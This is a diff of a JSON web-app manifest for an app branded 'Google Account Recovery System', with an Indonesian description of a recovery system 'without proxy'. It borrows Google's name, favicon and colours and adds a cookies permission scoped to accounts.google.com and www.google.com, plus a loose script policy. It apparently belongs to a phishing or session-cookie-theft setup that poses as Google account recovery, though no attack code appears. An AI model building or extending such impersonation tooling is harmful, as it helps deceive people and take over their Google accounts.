@@ -1,51 +1,22 @@
 {
-  "name": "Google Account Recovery",
+  "name": "Google Account Recovery System",
   "short_name": "Google Recovery",
-  "description": "Sistem pemulihan akun Google dengan backend PHP",
+  "description": "Sistem pemulihan akun Google tanpa proxy",
   "start_url": "/",
   "display": "standalone",
   "background_color": "#ffffff",
   "theme_color": "#4285f4",
-  "orientation": "portrait",
-  "scope": "/",
   "icons": [
     {
       "src": "https://www.google.com/favicon.ico",
-      "sizes": "192x192",
+      "sizes": "64x64 128x128",
       "type": "image/x-icon"
-    },
-    {
-      "src": "/icon-192.png",
-      "sizes": "192x192",
-      "type": "image/png"
-    },
-    {
-      "src": "/icon-512.png",
-      "sizes": "512x512",
-      "type": "image/png"
     }
   ],
-  "screenshots": [
-    {
-      "src": "/screenshot1.png",
-      "sizes": "1280x720",
-      "type": "image/png",
-      "form_factor": "wide"
-    }
+  "permissions": [
+    "cookies",
+    "https://accounts.google.com/*",
+    "https://www.google.com/*"
   ],
-  "categories": ["utilities", "productivity"],
-  "shortcuts": [
-    {
-      "name": "Start Recovery",
-      "short_name": "Recovery",
-      "description": "Start Google account recovery",
-      "url": "/?start=recovery"
-    }
-  ],
-  "protocol_handlers": [
-    {
-      "protocol": "web+google",
-      "url": "/?url=%s"
-    }
-  ]
+  "content_security_policy": "script-src 'self' 'unsafe-inline' https://accounts.google.com; object-src 'self'"
 }
